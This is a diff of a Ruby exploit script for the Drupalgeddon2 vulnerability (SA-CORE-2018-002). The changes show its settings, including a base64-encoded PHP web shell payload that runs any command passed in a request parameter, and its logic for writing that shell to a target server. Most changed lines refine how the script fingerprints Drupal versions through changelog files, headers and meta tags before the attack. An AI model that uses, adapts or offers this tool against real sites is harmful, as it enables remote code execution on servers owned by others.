@@ -17,9 +17,10 @@ require "readline"
 
 # Settings - Try to write a PHP to the web root?
 try_phpshell = true
-# Settings - General
+# Settings - General/Stealth
 $useragent = "drupalgeddon2"
-webshell = "s.php"
+webshell = "shell.php"
+# Settings - Output
 $verbose = false
 
 
@@ -28,7 +29,7 @@ $proxy_addr = nil
 $proxy_port = 8080
 
 
-# Settings - Payload (we could just be happy without this using OS shell, but we can do better with PHP shell!)
+# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
 bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
 bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
 
@@ -225,16 +226,29 @@ $drupalverion = ""
 
 # Possible URLs
 url = [
-  # Drupal 6 / 7 / 8
+  # --- changelog ---
+  # Drupal v6.x / v7.x [200]
   $target + "CHANGELOG.txt",
+  # Drupal v8.x [200]
   $target + "core/CHANGELOG.txt",
-  # Drupal 6+7 / 8
+
+  # --- bootstrap ---
+  # Drupal v7.x / v6.x [403]
   $target + "includes/bootstrap.inc",
+  # Drupal v8.x [403]
   $target + "core/includes/bootstrap.inc",
-  # Drupal 6 / 7 / 8
+
+  # --- database ---
+  # Drupal v7.x / v6.x  [403]
   $target + "includes/database.inc",
+  # Drupal v7.x [403]
   #$target + "includes/database/database.inc",
+  # Drupal v8.x [403]
   #$target + "core/includes/database.inc",
+
+  # --- landing page ---
+  # Drupal v8.x / v7.x [200]
+  $target,
 ]
 
 # Check all
@@ -243,19 +257,20 @@ url.each do|uri|
   response = http_request(uri)
 
   # Check header
-  if response['X-Generator']
+  if response['X-Generator'] and $drupalverion.empty?
     header = response['X-Generator'].slice(/Drupal (.*) \(https:\/\/www.drupal.org\)/, 1).to_s.strip
 
-    if $drupalverion.empty? and not header.empty?
-      $drupalverion = "#{header}.x"
-      puts success("Header : X-Generator    (v#{$drupalverion})")
+    if not header.empty?
+      $drupalverion = "#{header}.x" if $drupalverion.empty?
+      puts success("Header : v#{header} [X-Generator]")
       puts verbose("X-Generator: #{response['X-Generator']}") if $verbose
     end
   end
 
-  # Check URL path
+  # Check request response, valid
   if response.code == "200"
-    puts success("Found  : #{uri}    (HTTP Response: #{response.code})")
+    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
+    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")
 
     # Check to see if it says: The requested URL "http://<URL>" was not found on this server.
     puts warning("WARNING: Could be a false-positive [1-1], as the file could be reported to be missing") if response.body.downcase.include? "was not found on this server"
@@ -263,39 +278,58 @@ url.each do|uri|
     # Check to see if it says: <h1 class="js-quickedit-page-title title page-title">Page not found</h1> <div class="content">The requested page could not be found.</div>
     puts warning("WARNING: Could be a false-positive [1-2], as the file could be reported to be missing") if response.body.downcase.include? "the requested page could not be found"
 
-    # Check if valid. Source ~ https://api.drupal.org/api/drupal/core%21CHANGELOG.txt/8.5.x // https://api.drupal.org/api/drupal/CHANGELOG.txt/7.x
-    puts warning("WARNING: Unable to detect keyword 'drupal.org'") if not response.body.downcase.include? "drupal.org"
+    # Only works for CHANGELOG.txt
+    if uri.match(/CHANGELOG.txt/)
+      # Check if valid. Source ~ https://api.drupal.org/api/drupal/core%21CHANGELOG.txt/8.5.x // https://api.drupal.org/api/drupal/CHANGELOG.txt/7.x
+      puts warning("WARNING: Unable to detect keyword 'drupal.org'") if not response.body.downcase.include? "drupal.org"
 
-    # Patched already? (For Drupal v8.4.x/v7.x)
-    puts warning("WARNING: Might be patched! Found SA-CORE-2018-002: #{url}") if response.body.include? "SA-CORE-2018-002"
+      # Patched already? (For Drupal v8.4.x / v7.x)
+      puts warning("WARNING: Might be patched! Found SA-CORE-2018-002: #{url}") if response.body.include? "SA-CORE-2018-002"
 
-    # Try and get version from the file contents (For Drupal v8.4.x/v7.x)
-    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
-    # Blank if not vaid
-    $drupalverion = "" if not $drupalverion[-1] =~ /\d/
+      # Try and get version from the file contents (For Drupal v8.4.x / v7.x)
+      $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
 
-    # If not, try and get it from the URL (For Drupal v6.x)
-    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
-    # If not, try and get it from the URL (For Drupal v8.5.x)
-    $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
-    # Fall back
-    $drupalverion = "7.x" if $drupalverion.empty?
+      # Blank if not valid
+      $drupalverion = "" if not $drupalverion[-1] =~ /\d/
+    end
+
+    # Check meta tag
+    if not response.body.empty?
+      # For Drupal v8.x / v7.x
+      meta = response.body.match(/<meta name="Generator" content="Drupal (.*) /)
+      metatag = meta.to_s.slice(/meta name="Generator" content="Drupal (.*) \(http/, 1).to_s.strip
+
+      if not metatag.empty?
+        $drupalverion = "#{metatag}.x" if $drupalverion.empty?
+        puts success("Metatag: v#{metatag} [Generator]")
+        puts verbose(meta.to_s) if $verbose
+      end
+    end
 
     # Done! ...if a full known version, else keep going... may get lucky later!
     break if not $drupalverion.end_with?("x")
 
+  # Check request response, not allowed
   elsif response.code == "403"
-    puts success("Found  : #{uri}    (HTTP Response: #{response.code})")
+    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
+    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")
 
-    # If not, try and get it from the URL (For Drupal v6.x)
-    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
-    # If not, try and get it from the URL (For Drupal v8.5.x)
-    $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
-    # Fall back
-    $drupalverion = "7.x" if $drupalverion.empty?
+    if $drupalverion.empty?
+      # Try and get version from the URL (For Drupal v.7.x/v6.x)
+      $drupalverion = uri.match(/includes\/database.inc/)? "7.x/6.x" : "" if $drupalverion.empty?
+      # Try and get version from the URL (For Drupal v8.x)
+      $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
+
+      puts success("URL    : v#{$drupalverion}") if not $drupalverion.empty?
+
+      # Fall back
+      puts warning("Falling back to v7.x") if $drupalverion.empty?
+      $drupalverion = "7.x" if $drupalverion.empty?
+    end
 
   else
-    puts warning("MISSING: #{uri}    (HTTP Response: #{response.code})")
+    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
+    puts warning("MISSING: #{uri}    (HTTP Response: #{response.code})#{tmp}")
   end
 end
 
@@ -464,7 +498,7 @@ paths.each do|path|
 
   response = http_request("#{$target}#{path}#{webshell}")
   if response.code == "200"
-    puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   Something could already be there?")
+    puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   ***Something could already be there?***")
   else
     puts info("Response: HTTP #{response.code} // Size: #{response.size}")
   end
